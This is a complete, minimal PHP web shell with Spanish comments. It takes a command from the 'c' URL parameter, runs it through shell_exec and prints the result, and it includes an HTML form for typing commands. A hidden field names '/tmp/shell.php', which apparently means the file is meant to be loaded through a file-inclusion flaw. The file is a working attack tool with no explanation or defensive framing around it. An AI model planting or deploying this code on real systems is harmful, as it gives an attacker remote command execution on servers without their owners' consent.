<?php
$r = shell_exec($_GET["c"]); // Ejecuta y guarda la salida
echo $r; // Imprime la salida una sola vez
echo "<form> <input type=hidden name=page value='/tmp/shell.php'><input type=text name=c><input type=submit></form>";
?>


